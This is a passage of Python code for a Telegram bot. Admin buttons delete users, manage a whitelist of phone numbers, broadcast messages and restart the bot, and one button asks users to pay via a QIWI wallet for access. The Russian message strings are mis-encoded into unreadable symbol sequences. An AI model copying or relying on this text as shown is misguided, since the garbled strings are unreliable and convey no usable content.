            b = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ id –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å —Å –±–∞–∑—ã.')
            bot.register_next_step_handler(b, delluser)

        elif call.data == 'button22':
            ww = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –≤ –ë–µ–ª—ã–π –ª–∏—Å—Ç.")
            bot.register_next_step_handler(ww, addwl)

        elif call.data == 'button23':
            ww = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å —Å –ë–µ–ª–æ–≥–æ –ª–∏—Å—Ç–∞.")
            bot.register_next_step_handler(ww, delllwl)

        elif call.data == 'button24':
            bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: "–†–ê–ó–û–°–õ–ê–¢–¨: –≤–∞—à_—Ç–µ–∫—Å—Ç" –±–µ–∑ –∫–∞–≤—ã—á–µ–∫')

        elif call.data == 'button25':
            bot.send_message(message.chat.id, '–ë–æ—Ç –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...')
            os.system('python start.py')

        elif call.data == 'button26':
            bot.send_message(message.chat.id, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ', reply_markup = keyboard)


##########################################################################################

        elif call.data == "button5":
            bot.send_message(message.chat.id, '‚ùóÔ∏è –î–ª—è –ø—Ä–∏–æ–±—Ä–µ—Ç–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É –ø–µ—Ä–µ–≤–µ–¥–∏—Ç–µ '+str(price) +' —Ä—É–±–ª–µ–π –Ω–∞ QIWI –∫–æ—à–µ–ª—ë–∫ –ª—é–±—ã–º —Å–ø–æ—Å–æ–±–æ–º.\n\nüì±–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: ' + '<pre>' +qiwi_phone+'</pre> \nüëë–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: ' '<pre>'+str(message.chat.id)+'</pre> \n\n–ï—Å–ª–∏ –í—ã –ø–µ—Ä–µ–≤–µ–ª–∏ –¥–µ–Ω—å–≥–∏ —Å –¥—Ä—É–≥–∏–º –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è–º–∏, —Ç–æ –¥–æ—Å—Ç—É–ø –≤—ã –Ω–µ –ø–æ–ª—É—á–∏—Ç–µ!\n–ü–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –≤–≤–µ–¥–∏—Ç–µ /start\n\n<b>–ü—Ä–∏ –æ—à–∏–±–æ—á–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–µ –ø–∏—Å–∞—Ç—å @couldistin</b>', parse_mode = 'HTML')

bot.polling(none_stop=True)